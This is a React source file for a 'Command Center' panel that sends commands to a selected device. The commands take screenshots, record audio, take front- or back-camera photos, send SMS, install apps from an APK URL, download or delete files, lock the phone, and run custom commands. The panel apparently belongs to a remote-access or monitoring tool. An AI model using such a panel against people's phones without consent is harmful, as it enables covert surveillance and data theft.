import React, { useState, useEffect } from 'react';
import {
  Box,
  Typography,
  Paper,
  Grid,
  Card,
  CardContent,
  CardHeader,
  Divider,
  TextField,
  Button,
  List,
  ListItem,
  ListItemText,
  ListItemIcon,
  Chip,
  Alert,
  CircularProgress,
  MenuItem,
  FormControl,
  InputLabel,
  Select,
  IconButton,
  Tooltip
} from '@mui/material';
import {
  Send as SendIcon,
  Refresh as RefreshIcon,
  Camera as CameraIcon,
  MicExternalOn as MicIcon,
  LocationOn as LocationIcon,
  AppSettingsAlt as AppIcon,
  ScreenshotMonitor as ScreenshotIcon,
  Sms as SmsIcon,
  FileCopy as FileIcon,
  Lock as LockIcon,
  CheckCircle as SuccessIcon,
  Error as ErrorIcon,
  Pending as PendingIcon
} from '@mui/icons-material';

import { sendCommand, getCommandHistory } from '../services/api';

// Command types
const commandTypes = [
  { value: 'location', label: 'Request Location', icon: <LocationIcon /> },
  { value: 'screenshot', label: 'Take Screenshot', icon: <ScreenshotIcon /> },
  { value: 'microphone', label: 'Record Audio', icon: <MicIcon /> },
  { value: 'camera', label: 'Take Photo', icon: <CameraIcon /> },
  { value: 'sms', label: 'Send SMS', icon: <SmsIcon /> },
  { value: 'app', label: 'Install/Uninstall App', icon: <AppIcon /> },
  { value: 'file', label: 'File Access', icon: <FileIcon /> },
  { value: 'lock', label: 'Lock/Unlock Device', icon: <LockIcon /> },
  { value: 'custom', label: 'Custom Command', icon: <SendIcon /> }
];

function CommandCenter({ devices, selectedDevice, onSelectDevice }) {
  const [commandType, setCommandType] = useState('location');
  const [commandParams, setCommandParams] = useState({});
  const [commandHistory, setCommandHistory] = useState([]);
  const [loading, setLoading] = useState(false);
  const [sending, setSending] = useState(false);
  const [error, setError] = useState(null);
  const [success, setSuccess] = useState(null);

  useEffect(() => {
    if (selectedDevice) {
      fetchCommandHistory();
    }
  }, [selectedDevice?.id]);

  const fetchCommandHistory = async () => {
    if (!selectedDevice) return;
    
    setLoading(true);
    setError(null);
    
    try {
      const data = await getCommandHistory(selectedDevice.id);
      setCommandHistory(data || []);
    } catch (error) {
      console.error('Error fetching command history:', error);
      setError('Failed to fetch command history. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const handleCommandTypeChange = (event) => {
    setCommandType(event.target.value);
    // Reset params when command type changes
    setCommandParams({});
  };

  const handleParamChange = (name, value) => {
    setCommandParams(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleSendCommand = async () => {
    if (!selectedDevice) return;
    
    setSending(true);
    setError(null);
    setSuccess(null);
    
    try {
      // Prepare command payload
      const command = {
        type: commandType,
        params: commandParams,
      };
      
      // Send command to API
      await sendCommand(selectedDevice.id, command);
      
      // Show success message
      setSuccess('Command sent successfully!');
      
      // Refresh command history
      fetchCommandHistory();
      
      // Reset params for next command
      setCommandParams({});
      
    } catch (error) {
      console.error('Error sending command:', error);
      setError('Failed to send command. Please try again.');
    } finally {
      setSending(false);
    }
  };

  const getStatusIcon = (status) => {
    switch (status) {
      case 'pending':
        return <PendingIcon color="warning" />;
      case 'completed':
        return <SuccessIcon color="success" />;
      case 'failed':
        return <ErrorIcon color="error" />;
      default:
        return <PendingIcon color="action" />;
    }
  };

  const getStatusChip = (status) => {
    return (
      <Chip 
        size="small"
        label={status ? status.charAt(0).toUpperCase() + status.slice(1) : 'Unknown'}
        color={
          status === 'completed' ? 'success' :
          status === 'pending' ? 'warning' :
          status === 'failed' ? 'error' : 'default'
        }
      />
    );
  };

  const renderCommandParams = () => {
    switch (commandType) {
      case 'location':
        return (
          <Grid container spacing={2}>
            <Grid item xs={12}>
              <Typography variant="body2" color="text.secondary">
                Request current device location. No additional parameters needed.
              </Typography>
            </Grid>
          </Grid>
        );
      
      case 'screenshot':
        return (
          <Grid container spacing={2}>
            <Grid item xs={12}>
              <Typography variant="body2" color="text.secondary">
                Take a screenshot of the device's current screen. No additional parameters needed.
              </Typography>
            </Grid>
          </Grid>
        );
      
      case 'microphone':
        return (
          <Grid container spacing={2}>
            <Grid item xs={12} sm={6}>
              <TextField
                fullWidth
                label="Duration (seconds)"
                type="number"
                value={commandParams.duration || ''}
                onChange={(e) => handleParamChange('duration', parseInt(e.target.value))}
                InputProps={{ inputProps: { min: 1, max: 300 } }}
                helperText="Duration in seconds (1-300)"
                required
              />
            </Grid>
          </Grid>
        );
      
      case 'camera':
        return (
          <Grid container spacing={2}>
            <Grid item xs={12} sm={6}>
              <FormControl fullWidth>
                <InputLabel>Camera</InputLabel>
                <Select
                  value={commandParams.camera || 'back'}
                  onChange={(e) => handleParamChange('camera', e.target.value)}
                  label="Camera"
                >
                  <MenuItem value="back">Back Camera</MenuItem>
                  <MenuItem value="front">Front Camera</MenuItem>
                </Select>
              </FormControl>
            </Grid>
            <Grid item xs={12} sm={6}>
              <TextField
                fullWidth
                label="Quality"
                type="number"
                value={commandParams.quality || ''}
                onChange={(e) => handleParamChange('quality', parseInt(e.target.value))}
                InputProps={{ inputProps: { min: 1, max: 100 } }}
                helperText="Image quality (1-100)"
              />
            </Grid>
          </Grid>
        );
      
      case 'sms':
        return (
          <Grid container spacing={2}>
            <Grid item xs={12} sm={6}>
              <TextField
                fullWidth
                label="Recipient"
                value={commandParams.recipient || ''}
                onChange={(e) => handleParamChange('recipient', e.target.value)}
                helperText="Phone number of recipient"
                required
              />
            </Grid>
            <Grid item xs={12}>
              <TextField
                fullWidth
                label="Message"
                multiline
                rows={3}
                value={commandParams.message || ''}
                onChange={(e) => handleParamChange('message', e.target.value)}
                helperText="SMS message content"
                required
              />
            </Grid>
          </Grid>
        );
      
      case 'app':
        return (
          <Grid container spacing={2}>
            <Grid item xs={12} sm={6}>
              <FormControl fullWidth>
                <InputLabel>Action</InputLabel>
                <Select
                  value={commandParams.action || 'install'}
                  onChange={(e) => handleParamChange('action', e.target.value)}
                  label="Action"
                >
                  <MenuItem value="install">Install</MenuItem>
                  <MenuItem value="uninstall">Uninstall</MenuItem>
                </Select>
              </FormControl>
            </Grid>
            <Grid item xs={12}>
              <TextField
                fullWidth
                label={commandParams.action === 'uninstall' ? 'Package Name' : 'APK URL'}
                value={commandParams.app_url || commandParams.package_name || ''}
                onChange={(e) => handleParamChange(
                  commandParams.action === 'uninstall' ? 'package_name' : 'app_url', 
                  e.target.value
                )}
                helperText={commandParams.action === 'uninstall' 
                  ? 'Package name (e.g., com.example.app)' 
                  : 'URL to APK file for installation'
                }
                required
              />
            </Grid>
          </Grid>
        );
      
      case 'file':
        return (
          <Grid container spacing={2}>
            <Grid item xs={12} sm={6}>
              <FormControl fullWidth>
                <InputLabel>Action</InputLabel>
                <Select
                  value={commandParams.action || 'download'}
                  onChange={(e) => handleParamChange('action', e.target.value)}
                  label="Action"
                >
                  <MenuItem value="download">Download</MenuItem>
                  <MenuItem value="upload">Upload</MenuItem>
                  <MenuItem value="delete">Delete</MenuItem>
                </Select>
              </FormControl>
            </Grid>
            <Grid item xs={12}>
              <TextField
                fullWidth
                label="File Path"
                value={commandParams.path || ''}
                onChange={(e) => handleParamChange('path', e.target.value)}
                helperText="Path to file on device"
                required
              />
            </Grid>
            {commandParams.action === 'upload' && (
              <Grid item xs={12}>
                <TextField
                  fullWidth
                  label="File URL"
                  value={commandParams.url || ''}
                  onChange={(e) => handleParamChange('url', e.target.value)}
                  helperText="URL to file to upload"
                  required
                />
              </Grid>
            )}
          </Grid>
        );
      
      case 'lock':
        return (
          <Grid container spacing={2}>
            <Grid item xs={12} sm={6}>
              <FormControl fullWidth>
                <InputLabel>Action</InputLabel>
                <Select
                  value={commandParams.action || 'lock'}
                  onChange={(e) => handleParamChange('action', e.target.value)}
                  label="Action"
                >
                  <MenuItem value="lock">Lock</MenuItem>
                  <MenuItem value="unlock">Unlock</MenuItem>
                </Select>
              </FormControl>
            </Grid>
            {commandParams.action === 'lock' && (
              <Grid item xs={12} sm={6}>
                <TextField
                  fullWidth
                  label="Lock Message"
                  value={commandParams.message || ''}
                  onChange={(e) => handleParamChange('message', e.target.value)}
                  helperText="Message to display on lock screen (optional)"
                />
              </Grid>
            )}
          </Grid>
        );
      
      case 'custom':
        return (
          <Grid container spacing={2}>
            <Grid item xs={12}>
              <TextField
                fullWidth
                label="Command"
                value={commandParams.command || ''}
                onChange={(e) => handleParamChange('command', e.target.value)}
                helperText="Custom command string"
                required
              />
            </Grid>
            <Grid item xs={12}>
              <TextField
                fullWidth
                label="Arguments (JSON)"
                multiline
                rows={3}
                value={commandParams.args || ''}
                onChange={(e) => handleParamChange('args', e.target.value)}
                helperText="Command arguments in JSON format (optional)"
              />
            </Grid>
          </Grid>
        );
      
      default:
        return null;
    }
  };

  // If no device is selected, show a message
  if (!selectedDevice) {
    return (
      <Box sx={{ p: 2 }}>
        <Typography variant="h6" gutterBottom>
          Command Center
        </Typography>
        <Paper sx={{ p: 2 }}>
          <Typography color="text.secondary" align="center">
            Please select a device to send commands
          </Typography>
        </Paper>
      </Box>
    );
  }

  return (
    <Box sx={{ p: 2 }}>
      <Typography variant="h6" gutterBottom>
        Command Center: {selectedDevice.name || selectedDevice.model || 'Device'}
      </Typography>
      
      <Grid container spacing={3}>
        {/* Command Input Section */}
        <Grid item xs={12} md={6}>
          <Card>
            <CardHeader 
              title="Send Command" 
              avatar={<SendIcon color="primary" />}
              action={
                <Button
                  variant="contained"
                  color="primary"
                  endIcon={sending ? <CircularProgress size={20} color="inherit" /> : <SendIcon />}
                  onClick={handleSendCommand}
                  disabled={sending}
                >
                  Send
                </Button>
              }
            />
            <Divider />
            <CardContent>
              {success && (
                <Alert severity="success" sx={{ mb: 2 }}>
                  {success}
                </Alert>
              )}
              
              {error && (
                <Alert severity="error" sx={{ mb: 2 }}>
                  {error}
                </Alert>
              )}
              
              <FormControl fullWidth sx={{ mb: 3 }}>
                <InputLabel>Command Type</InputLabel>
                <Select
                  value={commandType}
                  onChange={handleCommandTypeChange}
                  label="Command Type"
                  startAdornment={
                    <Box sx={{ mr: 1 }}>
                      {commandTypes.find(cmd => cmd.value === commandType)?.icon}
                    </Box>
                  }
                >
                  {commandTypes.map((command) => (
                    <MenuItem key={command.value} value={command.value}>
                      <ListItemIcon>
                        {command.icon}
                      </ListItemIcon>
                      <ListItemText primary={command.label} />
                    </MenuItem>
                  ))}
                </Select>
              </FormControl>
              
              {renderCommandParams()}
            </CardContent>
          </Card>
        </Grid>
        
        {/* Command History Section */}
        <Grid item xs={12} md={6}>
          <Card>
            <CardHeader 
              title="Command History" 
              action={
                <Tooltip title="Refresh history">
                  <IconButton onClick={fetchCommandHistory} disabled={loading}>
                    {loading ? <CircularProgress size={24} /> : <RefreshIcon />}
                  </IconButton>
                </Tooltip>
              }
            />
            <Divider />
            <CardContent sx={{ maxHeight: 400, overflow: 'auto' }}>
              {loading ? (
                <Box sx={{ display: 'flex', justifyContent: 'center', p: 2 }}>
                  <CircularProgress />
                </Box>
              ) : commandHistory.length === 0 ? (
                <Typography color="text.secondary" align="center">
                  No commands have been sent to this device
                </Typography>
              ) : (
                <List>
                  {commandHistory.map((command) => (
                    <ListItem 
                      key={command.id} 
                      divider 
                      alignItems="flex-start"
                      secondaryAction={getStatusChip(command.status)}
                    >
                      <ListItemIcon>
                        {commandTypes.find(cmd => cmd.value === command.type)?.icon || <SendIcon />}
                      </ListItemIcon>
                      <ListItemText
                        primary={
                          <Typography variant="subtitle2">
                            {commandTypes.find(cmd => cmd.value === command.type)?.label || 'Custom Command'}
                          </Typography>
                        }
                        secondary={
                          <>
                            <Typography variant="body2" component="span" color="text.secondary">
                              {new Date(command.timestamp).toLocaleString()}
                            </Typography>
                            {command.response && (
                              <Typography variant="body2" component="div" sx={{ mt: 1 }}>
                                Response: {command.response}
                              </Typography>
                            )}
                          </>
                        }
                      />
                    </ListItem>
                  ))}
                </List>
              )}
            </CardContent>
          </Card>
        </Grid>
      </Grid>
    </Box>
  );
}

export default CommandCenter;